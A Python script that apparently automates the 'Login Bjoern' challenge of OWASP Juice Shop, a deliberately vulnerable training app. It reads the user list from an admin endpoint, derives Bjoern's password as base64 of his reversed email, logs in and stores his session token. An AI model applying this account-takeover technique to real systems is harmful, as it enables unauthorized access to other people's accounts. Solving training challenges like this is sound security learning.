"""
This file is to automate the OWASP JUICESHOP TASK
LOGIN BJOERN
-------------------------------------------------
To login BJOERN, we do not use SQL injection, repetitive registration, etc.
We find his email and password to login in
"""


from plugins import attack as a
from plugins import admin_section as adSec
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class login_bjoern():
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/login'
        self.set_info()

    def get_email(self):
        dashboard = adSec.admin_section()
        response = dashboard.run()
        data_list = response.json()["data"]
        script = "bjoern"
        for i in range(len(data_list)):
            if script in data_list[i]["email"]:
                return data_list[i]["email"]
        #self.email = 'bjoern.kimminich@gmail.com' ### you can write a function to find this email
        return None

    def btoa_pass(self, email):
        reverse_email = email[::-1]
        password = base64.b64encode(reverse_email.encode("latin1")).decode("utf8")
        return password

    def set_info(self):
        self.email = self.get_email()
        self.password = self.btoa_pass(self.email)

    def generator(self,):
        json_data = {
            'email': self.email,
            'password': self.password,
        }
        return json_data

    def password_login(self):
        json_data = self.generator()
        response = self.juice_session.post(self.url, json=json_data)
        print(response.status_code)
        if response.status_code == 200:
            a.set_auth(self.email,response)
            a.set_basket_id(self.email,response)
            a.set_password(self.email, response, self.password)
            print("we solve the Challenge login Bjoern")
        print(response.text)
        return response

    def run(self):
        print('---------------------------------')
        print('Now let us to solve the Challenge Login Bjoern')
        self.password_login()